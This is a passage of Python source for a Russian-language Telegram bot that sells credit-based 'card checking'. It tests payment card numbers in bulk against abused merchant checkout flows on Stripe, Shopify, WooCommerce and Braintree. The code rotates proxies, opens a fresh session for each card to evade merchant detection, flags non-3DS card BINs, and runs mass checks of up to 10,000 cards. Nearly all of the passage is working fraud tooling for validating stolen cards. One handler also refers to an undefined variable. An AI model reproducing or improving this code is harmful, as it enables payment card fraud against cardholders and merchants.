    s5 = sum(1 for p in lines if p.startswith("socks5://"))
    s4 = sum(1 for p in lines if p.startswith("socks4://"))
    ht = sum(1 for p in lines if p.startswith("http://") or p.startswith("https://"))

    is_admin = bool(message.from_user and message.from_user.id in config.ADMIN_IDS)
    status_msg = await message.reply(
        f"📥 <b>Загружено {len(lines)} прокси</b> (всего в пуле: {len(merged)} шт.).\n"
        f"⚡ <i>Запускаю мгновенную проверку на живость...</i>",
        parse_mode=ParseMode.HTML
    )

    from proxy_manager import ProxyPool
    pool = ProxyPool(merged)
    fails_before = {e["url"]: e["fail_count"] for e in pool.entries}

    last_edit = 0.0
    async def _on_progress(done: int, total_p: int, alive_now: int):
        nonlocal last_edit
        now = time.time()
        if now - last_edit >= 3.0 or done == total_p:
            last_edit = now
            pct = int((done / total_p) * 100) if total_p else 0
            try:
                await status_msg.edit_text(
                    f"📡 <b>Проверка пула: {pct}%</b>\n"
                    f"• Проверено: <b>{done}</b> / {total_p}\n"
                    f"• Найдено живых: <b>{alive_now}</b>\n\n"
                    f"⚡ <i>Подробные логи летят в реальном времени в консоль...</i>",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass

    try:
        alive_count_raw, total = await pool.validate_all(concurrency=80, on_progress=_on_progress)
        dead_urls = {e["url"] for e in pool.entries
                     if not e["alive"] or e["fail_count"] > fails_before.get(e["url"], 0)}
        alive_urls = [e["url"] for e in pool.entries if e["url"] not in dead_urls]
        alive_count = len(alive_urls)
        dead_count = total - alive_count
        _atomic_write_lines(p_path, alive_urls)
        
        lats = sorted(e["latency_ms"] for e in pool.entries if e["url"] not in dead_urls and e.get("latency_ms"))
        med = lats[len(lats) // 2] if lats else 0
        s5_alive = sum(1 for u in alive_urls if u.startswith("socks5://"))
        s4_alive = sum(1 for u in alive_urls if u.startswith("socks4://"))
        ht_alive = sum(1 for u in alive_urls if u.startswith("http://") or u.startswith("https://"))

        await status_msg.edit_text(
            f"✅ <b>Прокси проверены и добавлены в активный пул:</b>\n"
            f"• Живых узлов: <b>{alive_count}</b> / {total}\n"
            f"• Протоколы: <b>SOCKS5: {s5_alive}</b> | <b>SOCKS4: {s4_alive}</b> | <b>HTTP: {ht_alive}</b>\n"
            f"• Отсеяно мёртвых: <b>{dead_count}</b>\n"
            f"• Медиана пинга: <b>{med} ms</b>\n\n"
            f"🔄 <i>Фоновый валидатор обновляет статус каждые 15 минут.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboards.proxy_kb(is_admin=is_admin)
        )
    except Exception as e:
        log.log_error("proxy_upload", "Validation failed after upload", e)
        await status_msg.edit_text(
            f"✅ <b>Добавлено {added} новых прокси</b> в список.\n"
            f"⚠️ Фоновая проверка завершится в ближайшем цикле (каждые 15 мин).",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboards.proxy_kb(is_admin=is_admin)
        )


@app.on_message(filters.command(["clearproxy"]))
@admin_only
@user_only
async def cmd_clearproxy(client, message: Message):
    p_path = os.path.join("data", "proxies.txt")
    _atomic_write_lines(p_path, [])
    await message.reply("🧹 Прокси-пул очищен.", parse_mode=ParseMode.HTML)


def _tier_parser(gate_name: str):
    """Таблица тиров ЦЕЛЕВОГО гейта: границы у storegate и shopify расходятся
    (100c попадало и в тир 1, и в тир 5), валидация чужой таблицей пропускала
    токен, который целевой гейт потом трактовал иначе."""
    if gate_name == "shopify":
        from bot.gates.shopify import parse_tier
        return parse_tier
    if gate_name == "storegate":
        from bot.gates.storegate import parse_tier
        return parse_tier
    return None


async def run_gate(message: Message, gate_name: str, argline: str,
                   tier: str | None = None):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
    # GATE_PRIORITY должен что-то значить: если гейт упал (ERROR = сбой движка,
    # кредит возвращён), чек уходит следующему живому. Раньше /chk умирал на
    # первом гейте приоритета и до остальных просто не доходил.
    tried: set[str] = set()
    status_msg = None
    while True:
        meta = GATES.get(gate_name)
        if not meta:
            return await message.reply(f"❌ Гейт {gate_name} не найден")
        tried.add(gate_name)
        # ценовой тир для storegate / shopify: '/st 1|5|20 CC MM YY CVV' — первый
        # короткий токен из PRICE_TIERS, карта начинается с 13-19 цифр — не спутается.
        # Тир может прийти и в имени команды (/st1) — тогда он уже задан, а дубль
        # в аргументах ('/st1 1 4111...') просто срезается, а не ломает разбор.
        parser = _tier_parser(gate_name)
        toks = argline.split()
        if toks and parser is not None and parser(toks[0]) is not None:
            if tier is None:
                tier = toks[0].lower()
            argline = " ".join(toks[1:])
        if tier is None and gate_name in ("storegate", "shopify"):
            saved = db.get_user_settings(u_id).get("selected_tier", "1")
            if saved not in ("all", "none"):
                tier = saved
        # формат валидируется ДО списания кредитов — кривой ввод не сжигает баланс.
        # Тот же parse_cards, что в /hit и /mass: запятые в '/chk 4111...,12,30,123'
        # раньше ломались, потому что _card_fields их не ел.
        cards = parse_cards(argline, limit=1)
        parts = cards[0] if cards else None
        if parts is None:
            return await message.reply(f"Формат: /{gate_name} CC MM YY CVV")
        masked = gc.mask_pan(parts[0])
        bad = card_rejection(parts)
        if bad:
            log.log_card("Rejected", masked, bad)
            return await message.reply(bad)
        cost = (meta["cost"] if meta["cost"] is not None else config.GATE_COST.get(gate_name, 1))
        if not db.spend_credit(u_id, gate_name):
            log.log_billing(u_id, f"Insufficient credits for {gate_name} (needs {cost})")
            return await message.reply(f"❌ Недостаточно кредитов ({cost}/чек). Используйте /redeem для пополнения")
        log.log_billing(u_id, f"spent {cost} credits for {gate_name}", balance=db.get_user(u_id).get("credits"))
        label = gate_label(gate_name, tier)
        log.log_router(f"Checking card {masked} via {label}...")
        if status_msg is None:
            status_msg = await message.reply(f"💳 Проверка · {label}...")
        else:
            await status_msg.edit_text(f"💳 Проверка · {label}...")
        t0 = asyncio.get_event_loop().time()
        bin6 = "".join(ch for ch in parts[0] if ch.isdigit())[:6]
        binfo_task = asyncio.ensure_future(setup_gate.bin_lookup(bin6))
        try:
            if tier and gate_name in ("storegate", "shopify"):
                res = await meta["fn"](*parts, tier=tier)
            else:
                res = await meta["fn"](*parts)
            verdict, detail = engine_cfg.coerce_verdict(res[0]), res[1]
            gate_extra = res[2] if len(res) > 2 else {}
        except Exception as e:
            verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:180]
            gate_extra = {}
            log.log_error(gate_name, f"Exception during gate call: {e}", exc=e)
        latency_ms = int((asyncio.get_event_loop().time() - t0) * 1000)
        log.log_verdict(gate_name, masked, verdict, detail=str(detail), latency_ms=latency_ms, proxy=gate_extra.get("proxy"))
        if engine_cfg.is_refundable(verdict):
            db.refund_credit(u_id, gate_name)  # сбой движка/смерть цели — кредит возвращается
            log.log_billing(u_id, f"refunded {cost} credits for {gate_name} ({verdict})", balance=db.get_user(u_id).get("credits"))
        try:
            binfo = await asyncio.wait_for(binfo_task, timeout=4)
        except Exception:
            binfo = {}
        if not engine_cfg.is_refundable(verdict):
            break
        nxt = _pick_gate(None, exclude=tried)
        if not nxt:
            log.log_router(f"No further fallback gates available in priority chain")
            break
        log.log_router(f"Fallback: gate '{gate_name}' unavailable -> trying next gate '{nxt}'")
        await status_msg.edit_text(
            f"⚠️ {label} недоступен ({str(detail)[:100]}) — пробую {GATE_LABELS.get(nxt, nxt)}…")
        gate_name = nxt
        if nxt not in ("storegate", "shopify"):
            tier = None  # тир — таблица целевого гейта; у setupwoo её нет
    if verdict in HIT_VERDICTS:
        db.add_hit(u_id)
    # админ-блок: прокси этого запроса + живой пул (динамически, на каждый чек)
    a_proxy = a_pool = None
    if u_id in config.ADMIN_IDS:
        a_proxy = gate_extra.get("proxy")
        a_pool = len(gc.load_proxies())
    await status_msg.edit_text(
        formatter.format_single(parts[0], binfo, gate_label(gate_name, tier), verdict,
                                detail, latency_ms, proxy=a_proxy, pool_size=a_pool),
        parse_mode=ParseMode.HTML,
        reply_markup=keyboards.check_prompt_kb(gate_name, tier or "1"))

ALL_GATE_CMDS = (list(GATES.keys()) + list(GATE_ALIASES.keys())
                 + list(TIERED_GATE_CMDS.keys()) + ["chk"])


def resolve_gate_cmd(cmd: str) -> tuple[str | None, str | None]:
    """Команда → (имя гейта, форс-тир). Чистая функция: без сети и без Message,
    поэтому её можно гонять в тестах (см. scratch/_bot_handler_probe.py)."""
    cmd = cmd.lstrip("/").split("@")[0].lower()
    if cmd in TIERED_GATE_CMDS:
        return TIERED_GATE_CMDS[cmd]
    gate_name, tier = GATE_ALIASES.get(cmd, cmd), None
    if cmd == "chk" and "chk" not in GATES:
        # /chk — не гейт, а авто-выбор лучшей доступной поверхности по
        # GATE_PRIORITY (только гейты с реально настроенными целями).
        # Без этой команды _pick_gate/_available_gates достижимы были только
        # из /mass, хотя АУДИТ и меню на неё ссылаются.
        gate_name = _pick_gate(None)
    return gate_name, tier


@app.on_message(filters.command(ALL_GATE_CMDS or ["none"]))
@user_only
async def gate_dispatch(client, message: Message):
    # команда может прийти caption'ом к медиа — message.text тогда None
    raw = message.text or message.caption or ""
    parts = raw.split()
    if not parts:
        return
    gate_name, tier = resolve_gate_cmd(parts[0])
    if parts[0].lstrip("/").split("@")[0].lower() == "chk" and not gate_name:
        return await message.reply("Нет доступных гейтов: ни одна поверхность не настроена.")
    if gate_name in GATES:
        argline = " ".join(parts[1:])
        return await run_gate(message, gate_name, argline, tier=tier)
    # Команда попала в фильтр, но гейт не зарегистрирован: модуль упал на
    # импорте и реестр его молча выбросил. Без этой ветки /au, /st, /sp
    # отвечали ТИШИНОЙ — причину было не понять.
    await message.reply(
        f"❌ Гейт <code>{html.escape(str(gate_name))}</code> недоступен — модуль не "
        f"загружен (см. лог старта). Живые: "
        f"<code>{html.escape(', '.join(GATES) or '—')}</code>",
        parse_mode=ParseMode.HTML)


# --- мультигейт: порядок выбора для /mass (форс первым аргументом) ---

GATE_PRIORITY = ["storegate", "setupwoo", "shopify", "piconfirm", "braintreenvbv"]


def _available_gates() -> list[str]:
    """A7: только гейты с реально настроенными целями.

    setupwoo проверяется как все остальные: load_ready_gates() читает
    data/ready_gates.json и подставляет fallback-донора, если пул пуст, — так что
    на практике он доступен всегда. Но раньше здесь стоял голый `True`, из-за
    которого приоритет из пяти гейтов заканчивался на первом, а поломку пула
    было невозможно увидеть извне.
    """
    from bot.gates.storegate import _targets as _st_targets
    from bot.gates.shopify import _targets as _sp_targets
    from bot.gates.piconfirm import _target as _pi_target
    from bot.gates.braintreenvbv import _targets as _bt_targets

    def _probe(fn) -> bool:
        try:
            return bool(fn())
        except Exception:
            return False

    ok = {"setupwoo": _probe(setup_gate.load_ready_gates),
          "storegate": _probe(_st_targets),
          "shopify": _probe(_sp_targets),
          "piconfirm": _probe(_pi_target),
          "braintreenvbv": _probe(_bt_targets)}
    return [g for g in GATE_PRIORITY if ok.get(g) and g in GATES]


def _pick_gate(force: str | None, exclude: set[str] | None = None) -> str | None:
    """Приоритет: живой SetupIntent-донор -> Store API -> Shopify -> PI -> VBV.

    exclude — уже опробованные гейты: run_gate передаёт их при фолл-троу после
    вердикта ERROR, чтобы не бить в тот же мёртвый гейт по второму кругу.
    """
    if force:
        return force if force in GATES else None
    for g in _available_gates():
        if not exclude or g not in exclude:
            return g
    return None





@app.on_message(filters.command(["hit"]))
@user_only
async def cmd_hit(client, message: Message):
    """Stripe Checkout /hit: /hit <cs_live-url> CC MM YY CVC [карта2 ...] —
    много карт по одному линку, каждая со своей СВЕЖЕЙ HTTP-сессией
    (разные TLS-фингерпринты/куки), пока линк жив. Разделители любые:
    пробелы, |, :, / или запятые — как привычно по остальным командам."""
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
    raw = (message.text or message.caption or "").split()
    if len(raw) < 3 or not raw[1].startswith("http") or "cs_" not in raw[1]:
        return await message.reply(
            "Формат: <code>/hit &lt;cs_live-url&gt; CC MM YY CVC [карта2 ...]</code> — линк любого Stripe Checkout, до 10 карт за раз",
            parse_mode=ParseMode.HTML)
    target_url = raw[1]
    # карты: остальные токены + многострочность (reply на сообщение с картами тоже работает)
    card_lines = " ".join(raw[2:])
    if "\n" in (message.text or ""):
        card_lines = (message.text or "").split("\n", 1)[1].replace(target_url, " ")
    cards = parse_cards(card_lines, limit=10)
    if not cards:
        return await message.reply("Карта не распознана: CC MM YY CVV")
    meta_cost = config.GATE_COST.get("hit", 2)  # раньше стоял голый 2 и молча
                                                # расходился с GATE_COST при правке цен
    results: list[dict] = []
    # Валидация ДО прогона — как в /chk и /mass: кривая карта не сжигает кредит
    good_cards: list[list[str]] = []
    for f in cards:
        bad = card_rejection(f)
        if bad:
            results.append({"card": _safe_pan(f[0]), "status": "INVALID",
                            "detail": bad.lstrip("❌ ").strip()[:60]})
        else:
            good_cards.append(f)
    if not good_cards:
        return await message.reply("❌ Ни одной валидной карты.")

    u = db.get_user(u_id)
    is_prem = db.is_premium(u)
    if not is_prem and u.get("credits", 0) < len(good_cards) * meta_cost:
        return await message.reply(
            f"❌ Недостаточно кредитов: {len(good_cards)} карт × {meta_cost} = {len(good_cards) * meta_cost}")
    status_msg = await message.reply(f"⚡ /hit · {len(good_cards)} карт · бью по линку со свежими сессиями...")
    log.log_hit(f"User {u_id} started /hit: {len(good_cards)} cards on {target_url}")
    # Прокси на прогон: бот-/hit больше не светит IP оператора (AUD-016, бот-путь).
    # Взрыв прокси на open НЕ объявляет линк мёртвым — один ретрай direct.
    hit_proxy = gc.pick_proxy(gc.load_proxies(), None)
    if hit_proxy:
        log.log_proxy("Using proxy for /hit", hit_proxy)
    link_dead = None
    for idx, f in enumerate(good_cards, 1):
        if link_dead:
            results.append({"card": _safe_pan(f[0]), "status": "ERROR",
                            "detail": f"линк умер: {link_dead[:60]}"})
            continue
        try:
            got = db.spend_credit(u_id, "hit")
        except Exception as e:
            results.append({"card": _safe_pan(f[0]), "status": "ERROR",
                            "detail": f"billing: {type(e).__name__}"[:60]})
            continue
        if not got:
            results.append({"card": _safe_pan(f[0]), "status": "ERROR",
                            "detail": "Недостаточно кредитов"})
            link_dead = "кредиты закончились"
            continue
        gs = None
        try:
            # СВЕЖАЯ сессия на каждую карту. Конструктор ВНУТРИ try: раньше он
            # стоял снаружи, и исключение в нём оставляло gs неопределённым для
            # finally (NameError) при уже списанном кредите и без возврата.
            log.log_hit(f"[{idx}/{len(good_cards)}] Checking card {_safe_pan(f[0])}...")
            gs = hit_engine.CsHitSession(target_url, proxy=hit_proxy)
            ok, detail = await gs.open()
            if not ok and hit_proxy:
                # прокси мог упасть сам по себе — не хороним линк, пробуем direct
                log.log_proxy("/hit open failed via proxy, retrying direct", hit_proxy, str(detail)[:60])
                await gs.close()
                hit_proxy = None
                gs = hit_engine.CsHitSession(target_url)
                ok, detail = await gs.open()
            if not ok:
                db.refund_credit(u_id, "hit")
                link_dead = detail[:80]
                results.append({"card": _safe_pan(f[0]), "status": "ERROR",
                                "detail": f"линк: {detail[:80]}"})
                continue
            res = await gs.check_card("|".join(f))
        except Exception as e:
            # возврат делает общий блок ниже — здесь только verdict, иначе
            # кредит возвращался дважды
            res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
            log.log_error("hit", f"Error checking {_safe_pan(f[0])}: {e}", exc=e)
        finally:
            # закрытие ровно один раз: раньше было и в теле ветки, и в finally
            if gs is not None:
                try:
                    await gs.close()
                except Exception:
                    pass
        verdict = engine_cfg.coerce_verdict(res.get("status", "ERROR"))
        detail = str(res.get("detail", ""))
        amount = res.get("amount_cents") or 0
        currency = res.get("currency") or ""
        if engine_cfg.is_refundable(verdict):
            # ERROR и смерть сессии (SESSION_EXPIRED/CANCELED) — кредит возвращается;
            # мёртвый линк останавливает очередь: следующие карты не сжигаются
            db.refund_credit(u_id, "hit")
            if verdict in ("SESSION_EXPIRED", "SESSION_CANCELED"):
                link_dead = detail[:60]
        else:
            price_s = formatter.fmt_price(amount, currency)
            detail = f"[{price_s}] {detail}" if price_s else detail
            if verdict in HIT_VERDICTS:
                db.add_hit(u_id)
        log.log_verdict("hit", _safe_pan(f[0]), verdict, detail=detail[:60])
        results.append({"card": _safe_pan(f[0]), "status": verdict,
                        "detail": detail[:60]})
        if idx < len(good_cards):
            await asyncio.sleep(1.2)
    pool_line = f" | 📡 Пул: {len(gc.load_proxies())}" if u_id in config.ADMIN_IDS else ""
    summary = (f"⚡ <b>/hit · {len(results)}/{len(cards)} карт</b>{pool_line}\n"
               + formatter.format_mass(results, header=False))
    # TG-лимит: режем на чанки
    chunk, chunks = [], []
    for line in summary.split("\n"):
        if len("\n".join(chunk)) + len(line) + 1 > 3900:
            chunks.append("\n".join(chunk))
            chunk = []
        chunk.append(line)
    chunks.append("\n".join(chunk))
    await status_msg.edit_text(chunks[0], parse_mode=ParseMode.HTML)
    for extra in chunks[1:]:
        await message.reply(extra, parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["mass"]))
@user_only
async def cmd_mass(client, message: Message):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")

    cards_text = ""
    gate_forced = None
    tier_forced = None

    # форс гейта первым аргументом: имя, алиас (/st) или команда с тиром (/st1)
    parts = (message.text or "").split()
    if len(parts) > 1:
        tok = parts[1].lower()
        if tok in TIERED_GATE_CMDS:
            gate_forced, tier_forced = TIERED_GATE_CMDS[tok]
            raw_tail = " ".join(parts[2:])
        elif GATE_ALIASES.get(tok, tok) in GATES:
            gate_forced = GATE_ALIASES.get(tok, tok)
            raw_tail = " ".join(parts[2:])
        else:
            raw_tail = " ".join(parts[1:])
    else:
        raw_tail = ""

    # Check if document / reply
    if message.reply_to_message and message.reply_to_message.document:
        doc = await message.reply_to_message.download(in_memory=True)
        cards_text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif message.document:
        doc = await message.download(in_memory=True)
        cards_text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif raw_tail.strip():
        cards_text = raw_tail

    u = db.get_user(u_id)
    is_admin = bool(u_id in config.ADMIN_IDS or db.is_developer(u))
    is_prem = db.is_premium(u)
    max_batch = 10000 if is_admin else (100 if is_prem else 20)

    if not cards_text.strip():
        limit_desc = "безлимит (Admin/Dev)" if is_admin else f"до {max_batch} карт"
        return await message.reply(
            "<b>Использование массовой проверки:</b>\n"
            "• <code>/mass [гейт] CC MM YY CVV\nCC MM YY CVV...</code>\n"
            "• Гейт: <code>au</code> / <code>st</code> <code>1|5|20</code> / <code>st1</code> / <code>sp20</code>\n"
            "• Или ответом на .txt файл: <code>/mass [гейт]</code>\n"
            f"({limit_desc})", parse_mode=ParseMode.HTML)

    valid_cards = parse_cards(cards_text, limit=10 ** 6, dedupe=False)

    if not valid_cards:
        return await message.reply("❌ Не найдено карт в подходящем формате (ожидается CC MM YY CVV).")

    if len(valid_cards) > max_batch:
        await message.reply(f"⚠️ Лимит {max_batch} карт за прогон — взяты первые {max_batch} из {len(valid_cards)}.")
    valid_cards = valid_cards[:max_batch]

    # Семантическая валидация ДО прогона: кривая карта не сжигает кредит, не
    # занимает слот семафора и не уходит к донору — она сразу ложится в отчёт
    # как INVALID. Раньше она доходила до _normalize гейта и стоила полный чек.
    rejected: list[dict] = []
    good_cards: list[list[str]] = []
    for _cp in valid_cards:
        bad = card_rejection(_cp)
        if bad:
            rejected.append({"card": _safe_pan(_cp[0]), "status": "INVALID",
                             "detail": bad.lstrip("❌ ").strip()[:60], "_hit": False})
        else:
            good_cards.append(_cp)

    if not good_cards:
        reasons = "; ".join(dict.fromkeys(r["detail"] for r in rejected))[:300]
        return await message.reply(f"❌ Ни одной валидной карты. Причины: {reasons}")

    gate_name = _pick_gate(gate_forced)
    if not gate_name:
        return await message.reply("Нет загруженных гейтов")

    meta = GATES[gate_name]
    cost_per = (meta["cost"] if meta["cost"] is not None else config.GATE_COST.get(gate_name, 1))

    if not is_prem and not is_admin and u.get("credits", 0) < len(good_cards) * cost_per:
        return await message.reply(f"❌ Недостаточно кредитов. Требуется {len(good_cards) * cost_per} кредитов на {len(good_cards)} валидных карт.")

    status_msg = await message.reply(
        f"🚀 Запуск массовой проверки ({len(valid_cards)} карт) через <b>{gate_label(gate_name, tier_forced)}</b>...",
        parse_mode=ParseMode.HTML)

    log.log_mass(f"User {u_id} started mass check: {len(good_cards)} good, {len(rejected)} rejected via {gate_name} (tier={tier_forced})")

    # A5 (ИССЛЕДОВАНИЕ-СКОРОСТЬ.md): параллельный прогон вместо поочерёдного
    # с sleep 1.5с — semaphore(10 для админа, 5 дефолт) держит вежливый темп
    mass_sem = asyncio.Semaphore(10 if is_admin else 5)
    stop_evt = asyncio.Event()  # кредиты кончились — хвост не запускаем

    async def _check_one(card_parts: list[str]) -> dict | None:
        if stop_evt.is_set():
            return None
        async with mass_sem:
            if stop_evt.is_set():
                return None
            # spend_credit жил СНАРУЖИ try: один sqlite 'database is locked'
            # клал весь /mass, а уже запущенные задачи продолжали жечь кредиты
            # сиротами — пользователь видел только «Запуск...»
            try:
                got = db.spend_credit(u_id, gate_name)
            except Exception as e:
                return {"card": _safe_pan(card_parts[0]), "status": "ERROR",
                        "detail": f"billing: {type(e).__name__}"[:60], "_hit": False}
            if not got:
                stop_evt.set()
                return {"card": _safe_pan(card_parts[0]), "status": "ERROR",
                        "detail": "Недостаточно кредитов", "_hit": False}
            try:
                log.log_mass(f"Checking card {_safe_pan(card_parts[0])} via {gate_name}...")
                if tier_forced and gate_name in ("storegate", "shopify"):
                    res = await meta["fn"](*card_parts, tier=tier_forced)
                else:
                    res = await meta["fn"](*card_parts)
                # гейт волен вернуть 2 или 3 элемента — как в run_gate, а не
                # хрупким распаковыванием в две переменные
                verdict, detail = engine_cfg.coerce_verdict(res[0]), res[1]
            except Exception as e:
                verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:100]
                log.log_error(f"mass:{gate_name}", f"Error checking {_safe_pan(card_parts[0])}: {e}", exc=e)
            log.log_verdict(gate_name, _safe_pan(card_parts[0]), verdict, detail=str(detail)[:60])
            if engine_cfg.is_refundable(verdict):
                try:
                    db.refund_credit(u_id, gate_name)  # сбой движка/смерть цели — кредит возвращается
                except Exception:
                    pass  # неудавшийся возврат не должен ронять отчёт
            return {"card": _safe_pan(card_parts[0]),
                    "status": verdict, "detail": str(detail)[:60],
                    "_hit": verdict in HIT_VERDICTS}

    # return_exceptions=True обязателен: без него исключение вне try одной карты
    # отменяет весь gather, а отработавшие задачи не возвращают кредиты
    raw_results = await asyncio.gather(*[_check_one(cp) for cp in good_cards],
                                       return_exceptions=True)
    mass_results = list(rejected)
    approved_count = 0
    for r in raw_results:
        if r is None:
            continue
        if isinstance(r, BaseException):
            mass_results.append({"card": "?", "status": "ERROR",
                                 "detail": f"{type(r).__name__}: {r}"[:60]})
            continue
        if r.pop("_hit", False):
            db.add_hit(u_id)
            approved_count += 1
        mass_results.append(r)

    log.log_mass(f"Finished mass check for user {u_id}: {approved_count} approved out of {len(mass_results)}")

    pool_line = ""
    if u_id in config.ADMIN_IDS:
        pool_line = f" | 📡 Пул: {len(gc.load_proxies())}"
    summary = (f"🏁 <b>Массовая проверка завершена ({len(mass_results)}/{len(valid_cards)})</b>\n"
               f"Гейт: <code>{gate_label(gate_name, tier_forced)}</code> | Одобрено: <b>{approved_count}</b>{pool_line}\n\n"
               + formatter.format_mass(mass_results, header=False))
    # TG-лимит 4096 — режем на части по строкам
    chunk, chunks = [], []
    for line in summary.split("\n"):
        if len("\n".join(chunk)) + len(line) + 1 > 3900:
            chunks.append("\n".join(chunk))
            chunk = []
        chunk.append(line)
    chunks.append("\n".join(chunk))
    await status_msg.edit_text(chunks[0], parse_mode=ParseMode.HTML)
    for extra in chunks[1:]:
        await message.reply(extra, parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["bin"]))
@user_only
async def cmd_bin(client, message: Message):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ Слишком часто — подождите пару секунд (антиспам)")
    parts = (message.text or "").split()
    if not parts:
        return
    if len(parts) == 1 and len(parts[0]) == 6 and parts[0].isdigit():
        bin_query = parts[0]
    elif len(parts) >= 2:
        bin_query = "".join(ch for ch in parts[1] if ch.isdigit())[:6]
    else:
        return await message.reply("Формат: /bin 123456 или просто 6 цифр БИНа")
    if len(bin_query) < 6:
        return await message.reply("❌ БИН должен содержать минимум 6 цифр")
    import bin_cache
    binfo = await bin_cache.cached_lookup(bin_query, gc.bin_lookup_enriched)
    if not binfo or not binfo.get("scheme"):
        binfo = await setup_gate.bin_lookup(bin_query)

    scheme = (binfo.get("scheme") or binfo.get("brand") or "Неизвестно").upper()
    card_type = (binfo.get("type") or "Неизвестно").upper()
    level = (binfo.get("level") or "Standard").upper()
    bank = (binfo.get("bank") or {}).get("name") or "Неизвестно"
    country = binfo.get("country") or {}
    c_name = country.get("name") or "Неизвестно"
    c_a2 = country.get("alpha2") or ""
    is_vbv = binfo.get("is_vbv")
    vbv_str = "✅ ДА (3DS подключен)" if is_vbv is True else ("❌ НЕТ (Non-VBV)" if is_vbv is False else "❓ Неизвестно")

    log.log_bin(bin_query, f"{scheme} {card_type} ({level}) | {bank} [{c_a2 or '??'}] | VBV: {vbv_str}")

    esc = lambda s: html.escape(str(s), quote=False)
    text = (
        f"💳 <b>Информация о БИН:</b> <code>{bin_query}</code>\n\n"
        f"🏦 <b>Банк:</b> {esc(bank)}\n"
        f"🏷 <b>Система:</b> {esc(scheme)}\n"
        f"📋 <b>Тип:</b> {esc(card_type)} ({esc(level)})\n"
        f"🌍 <b>Страна:</b> {esc(c_name)} {f'({esc(c_a2)})' if c_a2 else ''}\n"
        f"🛡 <b>3DS / VBV:</b> {vbv_str}\n"
    )
    await status_msg.edit_text(text, parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["gates"]))
@user_only
async def cmd_gates(client, message: Message):
    lines = ["<b>Активные гейты движка:</b>"]
    for k, v in GATES.items():
        cost = v["cost"] if v["cost"] is not None else config.GATE_COST.get(k, 1)
        lines.append(f"• <code>/{k}</code> — стоимость: {cost} кр.")
    # /hit — не плагин реестра, в цикле выше его не было, хотя GATE_COST про
    # него знает и он списывает 2 кредита за карту. /gates молчал о платной
    # команде, и пользователь не видел, сколько она стоит.
    for k in ("hit",):
        if k not in GATES and k in config.GATE_COST:
            lines.append(f"• <code>/{k}</code> — стоимость: {config.GATE_COST[k]} кр/карта")

    data_dir = os.path.join(os.path.dirname(__file__), "..", "data")

    def load_json(name):
        p = os.path.join(data_dir, name)
        if os.path.exists(p):
            try:
                with open(p, "r", encoding="utf-8") as f:
                    d = json.load(f)
                return d if isinstance(d, list) else []
            except Exception:
                return []
        return []

    # SetupIntent-доноры (готовая ротация setup_gate); только реально READY
    ready = [g for g in load_json("ready_gates.json")
             if g.get("status", "READY") == "READY"]
    if ready:
        lines.append(f"\n<b>SetupIntent доноры ($0-auth):</b> ({len(ready)} онлайн)")
        for g in ready[:10]:
            dom = g.get("domain") or g.get("base_url")
            st = g.get("status", "READY")
            sr = int(float(g.get("success_rate") or 0.5) * 100)
            lat = g.get("latency_avg_ms")
            lat_s = f"{lat}мс" if lat is not None else "?"
            lines.append(f"  [{st}] <code>{dom}</code> ({sr}% SR | {lat_s})")

    # Store API / mint-гейты (фаза store-расширения); мёртвые и фантомные скрыты
    store = [g for g in load_json("store_gates.json")
             if not g.get("phantom") and not g.get("dead_surface")]
    if store:
        verified = [g for g in store if g.get("verified")]
        mint = [g for g in store if g.get("verify_status") == "APPROVED@PAID"
                and not g.get("verified")]
        lines.append(f"\n<b>Store-API гейты:</b> "
                     f"{len(store)} поверхностей | {len(verified)} проверено | {len(mint)} минт")
        for g in verified[:10]:
            dom = g.get("domain")
            vs = g.get("verify_status", "?")
            cheap = g.get("cheapest_cents")
            cheap_s = f" | от {cheap}¢" if cheap is not None else ""
            lines.append(f"  [✅ {vs}]{cheap_s} <code>{dom}</code>")
        for g in mint[:5]:
            lines.append(f"  [⚗️ PI_MINT] <code>{g.get('domain')}</code>")

    # Финальный сводный пул
    final = load_json("final_gates.json")
    if final:
        by_vec = {}
        for g in final:
            by_vec.setdefault(g.get("vector", "?"), []).append(g)
        lines.append(f"\n<b>Общий пул:</b> {len(final)} доноров ("
                     + " | ".join(f"{k}: {len(v)}" for k, v in by_vec.items()) + ")")
    await message.reply("\n".join(lines), parse_mode=ParseMode.HTML,
                        reply_markup=keyboards.gates_monitor_kb())


@app.on_message(filters.command(["stats"]))
@user_only
async def cmd_stats(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    u = db.get_user(message.from_user.id)
    g_stats = db.get_global_stats()

    prem = db.is_premium(u)
    text = (
        f"📊 <b>Личная статистика:</b>\n"
        f"• ID пользователя: <code>{u['user_id']}</code>\n"
        f"• Статус: {'♦ <b>ПРЕМИУМ</b>' if prem else 'Базовый'}\n"
        f"• Кредиты: <b>{u['credits']}</b>\n"
        f"• Проверок: <b>{u['total_checks']}</b>\n"
        f"• Успешных (Live): <b>{u['hits']}</b>\n\n"
        f"🌐 <b>Общая статистика:</b>\n"
        f"• Пользователей: <b>{g_stats['users_count']}</b>\n"
        f"• Премиум пользователей: <b>{g_stats['premium_users']}</b>\n"
        f"• Всего проверок: <b>{g_stats['total_checks']}</b>\n"
        f"• Всего Live-хитов: <b>{g_stats['total_hits']}</b>\n"
    )
    await message.reply(text, parse_mode=ParseMode.HTML,
                        reply_markup=keyboards.profile_kb())



# --- admin ---

@app.on_message(filters.command(["addcredits"]))
@admin_only
